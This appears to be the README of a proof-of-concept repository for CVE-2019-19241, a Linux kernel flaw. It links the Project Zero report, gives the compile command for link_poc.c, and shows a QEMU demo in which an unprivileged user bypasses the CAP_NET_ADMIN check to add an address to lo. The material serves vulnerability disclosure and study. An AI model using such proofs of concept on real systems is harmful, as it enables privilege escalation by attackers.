# CVE-2019-19241

## Details
project zero blog: https://bugs.chromium.org/p/project-zero/issues/detail?id=1975

and mine: TODO

## Demo

**compile the POC directly**
```
gcc link_poc.c -o link_poc
```

*of course, the demo rootfs already contains this executable*

```
$ ./start.sh	# launch the QEMU, login in the shell with user/AAA
...
$ ip addr show dev lo 	# show correct plain lo info
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever

$ id
uid=1000(user) gid=1000(user) groups=1000(user)

$ ip addr add 1.2.3.4/32 dev lo # this is a priviledged operation
                                # CAP_NET_ADMIN required
ip: RTNETLINK answers: Operation not permitted

$ ./link_poc
submitted 2, getevents done
cq_tail = 2
result: 32

$ ip addr show dev lo
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 1.2.3.4/32 scope global lo <-- wow, hacked
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
```
